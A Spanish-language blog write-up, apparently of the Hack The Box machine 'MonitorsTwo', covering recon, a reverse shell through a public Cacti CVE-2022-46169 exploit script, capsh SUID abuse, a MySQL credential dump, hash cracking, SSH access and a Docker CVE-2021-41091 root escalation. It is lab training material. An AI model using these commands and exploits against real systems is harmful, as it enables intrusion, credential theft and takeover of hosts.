---
layout: post
title: MONITORS TWO WRITEUP.
subtitle: Resolucion de la maquina monitors two de HTB.
header-img: img/in-post/monitors_two/monitors-two.webp
header-style: image
header-mask: rgba(0, 0, 0, .4)
catalog: true
tags:
  - HTB
  - docker-abuse
---


  <!-- HTML Meta Tags -->
  <title>MONITORS TWO WRITEUP.</title>
  <meta name="description" content="Resolución de la máquina monitors two de HTB.">
  <!-- Facebook Meta Tags -->
  <meta property="og:url" content="https://quantumwavves.github.io/2023/09/21/monitors-two/">
  <meta property="og:type" content="website">
  <meta property="og:title" content="MONITORS TWO WRITEUP.">
  <meta property="og:description" content="Resolución de la máquina monitors two de HTB.">
  <meta property="og:image" content="https://quantumwavves.github.io/img/in-post/monitors_two/monitors-two.webp">

  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="quantumwavves.github.io">
  <meta property="twitter:url" content="https://quantumwavves.github.io/2023/09/21/monitors-two/">
  <meta name="twitter:title" content="MONITORS TWO WRITEUP.">
  <meta name="twitter:description" content="Resolución de la máquina monitors two de HTB.">
  <meta name="twitter:image" content="https://quantumwavves.github.io/img/in-post/monitors_two/monitors-two.webp">

## Tools
- Python
- Netcat 
- John The Ripper
## Topics
- Remote Code Execution / Reverse Shell
- Docker
- CVE's 
- Privilege Escalation
- Password HASH cracking
- SSH

Hola, el dia de hoy vamos a resolver la maquina de monitors two de HTB.

Primero realizaremos un escaneo de reconocimiento con NMAP.

## Reconocimiento

```bash
sudo nmap -Pn -p- -A -T4 -oN scan.txt 10.10.11.211
```
Obtenemos el resultado del escaneo:

<img src="/img/in-post/monitors_two/nmap-scan.png" onclick="window.open(this.src)">

<p style="text-aling:justify">Observamos que existen dos puertos abiertos, el 22 que corresponde al servicio de SSH y el 80 que corresponde al servicio de HTTP. Revisamos el puerto 80 a través del navegador.</p>

<img src="/img/in-post/monitors_two/cacti-login.png" onclick="window.open(this.src)">

<p style="text-aling:justify">Observamos que es un login de Cacti, un software para el monitoreo de red. Probamos contraseñas default sin tener exito. Sin embargo podemos buscar CVE para la version 1.2.22 de cacti, misma que nos muestra en el login.</p>

## RCE / Reverse Shell

Después de una búsqueda encontramos una CVE para la versión 1.2.22.

- <a href ="https://cve.mitre.org/cgi-bin/cvename.cgi?name=VE-2022-46169">CVE 2022-46169</a>

Buscando encontre el siguiente script que nos ayuda con la RCE y nos brinda una reverse shell.

- <a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">FredBrave CVE-2022-46169</a>

Utilizare Netcat con los siguientes flags -n para que no haga resolucion de dns, -l para estar a la escucha, -v de verbose y -p que indica el puerto, en este caso 443:

```bash
sudo nc -nlvp 443
```

Utilizando el script para la RCE podremos obtener la reverse shell.

```bash
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST 10.10.16.79 --LPORT=443
```

<img src="/img/in-post/monitors_two/python-script.png" onclick="window.open(this.src)">

Ahora obtenemos la reverse shell a través del puerto 443.

<img src="/img/in-post/monitors_two/reverse-shell.png" onclick="window.open(this.src)">

## Escalada de privilegios

Utilizaremos esta herramienta para enumerar los binarios SUID.

- <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>

Crearemos un servidor web para poder acceder al recurso.

<img src="/img/in-post/monitors_two/python-webserver.png" onclick="window.open(this.src)">

Obtenemos el recurso con wget.

<img src="/img/in-post/monitors_two/wget-source.png" onclick="window.open(this.src)">

Le damos permisos de ejecucion.

```bash
chmod +x LinEnum.sh
  ```
<img src="/img/in-post/monitors_two/linenum-permission.png" onclick="window.open(this.src)">

Una vez ejecutado el script nos listara los archivos SUID, nos interesa el archivo ``/sbin/capsh``. ¿Por que nos interesa este archivo? Principalmente por que no pierde privilegios heredados, por que lo que puede funcionarnos como puerta trasera. Mas sobre este archivo:

- <a href="https://gtfobins.github.io/gtfobins/capsh/">gtfobins</a>

<img src="/img/in-post/monitors_two/suid-files.png" onclick="window.open(this.src)">

Nos dirigimos a la ruta ``/sbin`` donde se encuentra el archivo capsh y ejecutaremos el siguiente comando para poder escalar privilegios.

```bash
./capsh --gid=0 --uid=0 --
```

<img src="/img/in-post/monitors_two/capsh.png" onclick="window.open(this.src)">

## Obteniendo credenciales

Observamos que mysql esta dentro del contenedor, utilizamos el siguiente comando para listar a los usuarios root.

```bash
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
```

<img src="/img/in-post/monitors_two/mysql.png" onclick="window.open(this.src)">

Vemos que existe un usuario ``marcus`` y nos da un hash del password del usuario.

## Cracking Hash Password

Utilizaremos john the ripper para encontrar una coincidencia con un diccionario.

<img src="/img/in-post/monitors_two/john.png" onclick="window.open(this.src)">

Vemos que ha encontrado una posible coincidencia.

## Logeandose por ssh

Intentaremos acceder por ssh introduciendo las credenciales del usuario marcus.

<img src="/img/in-post/monitors_two/ssh-auth.png" onclick="window.open(this.src)">

Y listo, tenemos acceso desde el usuario ``marcus``.

<img src="/img/in-post/monitors_two/ssh-login.png" onclick="window.open(this.src)">

## Escalando privilegios

Listaremos la version de docker que se esta utilizando.

<img src="/img/in-post/monitors_two/docker-v.png" onclick="window.open(this.src)">

Vemos que es la version ``20.10.5+dfsg1``, buscaremos alguna CVE que pueda ayudarnos con la escalada de privilegios. Después de una busqueda encontre un script que nos ayuda con esta CVE.

- <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-41091">Mitre CVE 2021-41091</a>
- <a href="https://github.com/UncleJ4ck/CVE-2021-41091">CVE-2021-41091</a>

Para poder usar este script necesitamos volver al contenedor y asignar a /bin/bash permisos de suid.

<img src="/img/in-post/monitors_two/bash-u+s.png" onclick="window.open(this.src)">

Exponemos el recurso con un servidor web como lo hicimos anteriormente.

<img src="/img/in-post/monitors_two/wget-exp.png" onclick="window.open(this.src)">

Le damos permisos de ejecucion para poder utilizarlo. 

<img src="/img/in-post/monitors_two/exp-permission.png" onclick="window.open(this.src)">

Despues de la ejecucion vemos que nos arroja un path: <br> ``/var/lib/docker/overlay2/c41d5854e4bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged``.

<img src="/img/in-post/monitors_two/exp-exe.png" onclick="window.open(this.src)">

Nos dirigimos a ese directorio y ejecutamos el siguiente comando para obtener la shell en root.

```bash
./bin/bash -p
```

<img src="/img/in-post/monitors_two/powned.png" onclick="window.open(this.src)">

Y listo, ahora somos root.

<img src="https://media.tenor.com/oY3PFmGbo98AAAAC/furina-genshin.gif">

Eso ha sido todo por el post, si piensas que me he equivocado en la informacion o en que he omitido algo que pueda mejorar el post, puedes contactarme por discord ```quantumwavves```
